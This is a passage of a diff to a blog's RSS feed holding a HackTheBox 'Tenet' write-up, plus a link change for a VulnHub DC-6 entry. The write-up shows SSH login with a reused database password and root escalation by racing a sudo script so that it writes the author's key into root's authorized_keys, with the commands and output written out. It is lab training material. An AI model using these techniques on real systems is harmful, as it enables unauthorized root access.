+define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;Opera2112&#39;</span> <span class="o">)</span><span class="p">;</span>
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="ssh---neil">SSH - Neil</h4>
+<p>The credentials works on SSH (<code>neil:Opera2112</code>)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
+$ ssh neil@10.10.10.223
+neil@10.10.10.223<span class="err">&#39;</span>s password:
+Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
+
+...&lt;SNIP&gt;...
+
+Last login: Mon Jun <span class="m">14</span> 12:57:27 <span class="m">2021</span> from 10.10.16.12
+neil@tenet:~$ id
+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span>
+</code></pre></div><p>User&rsquo;s flag is done here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ ls -l
+total <span class="m">4</span>
+-r-------- <span class="m">1</span> neil neil <span class="m">33</span> Jun <span class="m">14</span> 06:46 user.txt
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210614200613572.png" alt="image-20210614200613572"  /></div>
+</p>
+<hr>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="sudo-privileges">Sudo privileges</h4>
+<p>User neil has sudo privileges on a custom script called <code>enableSSH.sh</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ sudo -l
+Matching Defaults entries <span class="k">for</span> neil on tenet:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>
+
+User neil may run the following commands on tenet:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
+neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">1080</span> Dec  <span class="m">8</span>  <span class="m">2020</span> /usr/local/bin/enableSSH.sh
+</code></pre></div><h4 id="script-analysis">Script analysis</h4>
+<p>The following is the contents of <code>enableSSH.sh</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+checkAdded<span class="o">()</span> <span class="o">{</span>
+
+        <span class="nv">sshName</span><span class="o">=</span><span class="k">$(</span>/bin/echo <span class="nv">$key</span> <span class="p">|</span> /usr/bin/cut -d <span class="s2">&#34; &#34;</span> -f 3<span class="k">)</span>
+
+        <span class="k">if</span> <span class="o">[[</span> ! -z <span class="k">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+
+                /bin/echo <span class="s2">&#34;Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
+
+        <span class="k">else</span>
+
+                /bin/echo <span class="s2">&#34;Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
+
+        <span class="k">fi</span>
+
+<span class="o">}</span>
+
+checkFile<span class="o">()</span> <span class="o">{</span>
+
+        <span class="k">if</span> <span class="o">[[</span> ! -s <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> ! -f <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+
+                /bin/echo <span class="s2">&#34;Error in creating key file!&#34;</span>
+
+                <span class="k">if</span> <span class="o">[[</span> -f <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi</span>
+
+                <span class="nb">exit</span> <span class="m">1</span>
+
+        <span class="k">fi</span>
+
+<span class="o">}</span>
+
+addKey<span class="o">()</span> <span class="o">{</span>
+
+        <span class="nv">tmpName</span><span class="o">=</span><span class="k">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="k">)</span>
+
+        <span class="o">(</span><span class="nb">umask</span> 110<span class="p">;</span> touch <span class="nv">$tmpName</span><span class="o">)</span>
+
+        /bin/echo <span class="nv">$key</span> &gt;&gt;<span class="nv">$tmpName</span>
+
+        checkFile <span class="nv">$tmpName</span>
+
+        /bin/cat <span class="nv">$tmpName</span> &gt;&gt;/root/.ssh/authorized_keys
+
+        /bin/rm <span class="nv">$tmpName</span>
+
+<span class="o">}</span>
+
+<span class="nv">key</span><span class="o">=</span><span class="s2">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
+addKey
+checkAdded
+</code></pre></div><p>The contents of the <code>$key</code> variable will be saved to a temporary file at <code>/tmp/SSH-randomfilename</code> before being added to the <code>/root/.ssh/authorized_keys</code> file by the <code>addKey()</code> function.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="nv">tmpName</span><span class="o">=</span><span class="k">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="k">)</span>
+neil@tenet:~$ <span class="nb">echo</span> <span class="nv">$tmpName</span>
+/tmp/ssh-4swbpcnN
+</code></pre></div><p>Then the  <code>checkAdded()</code> function will take the  <code>username@hostname</code> part from the value of <code>$key</code> which is <code>root@ubuntu</code> and check if it already exist in <code>/root/.ssh/authorized_keys</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...&lt;SNIP&gt;...
+ <span class="k">if</span> <span class="o">[[</span> ! -z <span class="k">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+                /bin/echo <span class="s2">&#34;Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
+        <span class="k">else</span>
+                /bin/echo <span class="s2">&#34;Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
+        <span class="k">fi</span>
+...&lt;SNIP&gt;...
+</code></pre></div><p>The idea here is if I could overwrite the file contents of <code>/tmp/ssh-randomfilename</code> with my own public key then I should be able to log in as root using my private key. So, it&rsquo;s a race condition.</p>
+<h4 id="exploiting-enablesshsh">Exploiting enableSSH.sh</h4>
+<p>Just like how I did earlier on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/#exploiting-scanloserssh">ScriptKiddie</a>, I&rsquo;ll also use while loop to keep inserting my public key at <code>/tmp/ssh-*</code>, but this time, I&rsquo;ll use a binary called <code>tee</code>.</p>
+<p>First, I&rsquo;ll put my public key at Neil&rsquo;s home directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@iamf&#39;</span> &gt; .iamf
+</code></pre></div><p>And Then I&rsquo;ll run this loop to keep user <code>neil</code> executing sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> sudo /usr/local/bin/enableSSH.sh<span class="p">;</span> <span class="k">done</span><span class="p">;</span>
+</code></pre></div><p>I&rsquo;ll open another neil&rsquo;s session and run this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="k">while</span> sleep 0.1<span class="p">;</span> <span class="k">do</span> cat .iamf <span class="p">|</span> tee /tmp/ssh-*<span class="p">;</span><span class="k">done</span>
+</code></pre></div><p>On my Kali, I will do SSH login in loop.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
+$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> ssh -oConnectTimeout<span class="o">=</span>1s -oPasswordAuthentication<span class="o">=</span>no root@10.10.10.223 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
+</code></pre></div><p>After some minutes, I can finally login as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ ssh root@10.10.10.223
+Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
+
+...&lt;SNIP&gt;...
+
+Last login: Tue Jun <span class="m">15</span> 09:50:37 <span class="m">2021</span> from 10.10.14.53
+root@tenet:~# id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210615165352952.png" alt="image-20210615165352952"  /></div>
+</p>
+<p>Root flag is done here.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
 </ul>
 ]]></content:encoded>
     </item>
@@ -855,10 +1702,10 @@ root@tenet:~# id
     
     <item>
       <title>VulnHub - DC-6</title>
-      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</link>
+      <link>https://fahmifj.github.io/vulnhub/dc6/</link>
       <pubDate>Sun, 30 May 2021 21:47:03 +0700</pubDate>
       
-      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc6/</guid>
+      <guid>https://fahmifj.github.io/vulnhub/dc6/</guid>
       <description>DC-6 starts off by enumerating usernames from a WordPress website and use a brute-force attack against it to log into the admin panel. One of the plugin used by the site is vulnerable to command injection, which can be exploited to gain a foothold on the system. Enumerating the home directory reveals a to-do note containing a set of user credentials. The user has sudo permissions on a writable backup script and on nmap, allowing me to escalate to the next user then straight to root.</description>
       <content:encoded><![CDATA[<p>DC-6 starts off by enumerating usernames from a WordPress website and use a brute-force attack against it to log into the admin panel. One of the plugin used by the site is vulnerable to command injection, which can be exploited to gain a foothold on the system. Enumerating the home directory reveals a to-do note containing a set of user credentials. The user has <code>sudo</code> permissions on a writable backup script and on <code>nmap</code>, allowing me to escalate to the next user then straight to root.</p>
 <h4 id="skills-learned">Skills Learned</h4>
